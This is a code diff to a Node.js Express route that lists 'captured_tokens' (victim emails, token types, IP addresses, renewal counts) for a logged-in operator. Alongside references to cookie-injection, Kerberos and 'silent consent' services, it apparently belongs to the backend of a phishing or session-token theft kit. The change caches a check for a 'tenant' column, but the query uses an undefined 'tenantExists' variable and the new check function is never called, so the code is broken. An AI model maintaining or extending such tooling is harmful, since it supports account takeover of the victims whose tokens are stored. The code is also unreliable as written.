@@ -7,6 +7,20 @@ const config = require('../config/env');
 const kerberosService = require('../services/kerberos');
 const silentConsentService = require('../services/silentconsent');
 
+// Cache for column existence check
+let hasTenantColumn = null;
+
+async function checkTenantColumn() {
+  if (hasTenantColumn !== null) return hasTenantColumn;
+  try {
+    const [columns] = await db.query("SHOW COLUMNS FROM captured_tokens LIKE 'tenant'");
+    hasTenantColumn = columns.length > 0;
+  } catch (e) {
+    hasTenantColumn = false;
+  }
+  return hasTenantColumn;
+}
+
 // ─── Skip /inject/* paths - these are handled by cookieinject.js ────
 // This prevents /api/tokens/inject/* from being matched by tokenRoutes
 router.get('/inject*', (req, res) => {
@@ -21,7 +35,7 @@ router.get('/', userAuth, async (req, res) => {
      const { sort, search, page = 1, limit = 50 } = req.query;
      // Filter out expired/stale tokens for cleaner UI
      const whereClause = 'deleted = 0 AND expiration > NOW() AND stale = 0';
-     let query = `SELECT id, user_id, link_id, email, token_type, ip_address, user_agent, notes, expiration, last_renewed, renewal_count, renewal_attempts, stale, deleted, created_at, tenant, template_type, account_type FROM captured_tokens WHERE user_id = ? AND ${whereClause}`;
+     let query = `SELECT id, user_id, link_id, email, token_type, ip_address, user_agent, notes, expiration, last_renewed, renewal_count, renewal_attempts, stale, deleted, created_at${tenantExists ? ', tenant' : ''}, template_type, account_type FROM captured_tokens WHERE user_id = ? AND ${whereClause}`;
     const params = [req.user.id];
 
     if (search) {
@@ -34,16 +48,13 @@ router.get('/', userAuth, async (req, res) => {
     query += ' LIMIT ? OFFSET ?';
     params.push(parseInt(limit), offset);
 
-    let tokens;
-    try {
-      const [t] = await db.query(query, params);
-      tokens = t;
-    } catch (e) {
-      // Fallback: try without tenant column if it doesn't exist
-      const fallbackQuery = query.replace('tenant, ', '').replace(', tenant', '');
-      const [t] = await db.query(fallbackQuery, params);
-      tokens = t.map(t => ({ ...t, tenant: 'common' }));
-    }
+    const [t] = await db.query(query, params);
+     let tokens = t;
+
+     // If tenant column doesn't exist in DB, add default
+     if (!tenantExists && tokens.length > 0) {
+       tokens = tokens.map(t => ({ ...t, tenant: 'common' }));
+     }
 
     const [countResult] = await db.query(
       'SELECT COUNT(*) as total FROM captured_tokens WHERE user_id = ? AND deleted = 0',
@@ -57,6 +68,7 @@ router.get('/', userAuth, async (req, res) => {
       pages: Math.ceil(countResult[0].total / parseInt(limit))
     });
   } catch (err) {
+    console.error('[Tokens] Get tokens error:', err.message);
     res.status(500).json({ error: 'Server error' });
   }
 });
